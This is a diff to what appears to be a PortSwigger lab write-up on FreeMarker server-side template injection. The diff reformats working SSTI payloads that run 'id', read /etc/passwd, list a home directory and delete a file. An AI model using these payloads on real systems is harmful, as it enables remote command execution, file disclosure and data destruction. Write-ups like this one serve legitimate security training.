@@ -77,12 +77,12 @@
 [freemarker_lab3](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/freemarker_lab3.png)
 
 - from the error message, i have known it is a `freemarker` template.
-
-> <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
-   <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("cat /etc/passwd")}
-   <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("ls /home/carlos")}
-   <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm -r /home/carlos/morale.txt")}
-
+```
+ <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+ <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("cat /etc/passwd")}
+ <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("ls /home/carlos")}
+ <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm -r /home/carlos/morale.txt")}
+```
 ---------------------------------------------------------------------
 
 ### Lab4: SSTI in an unknown language with a documented exploit
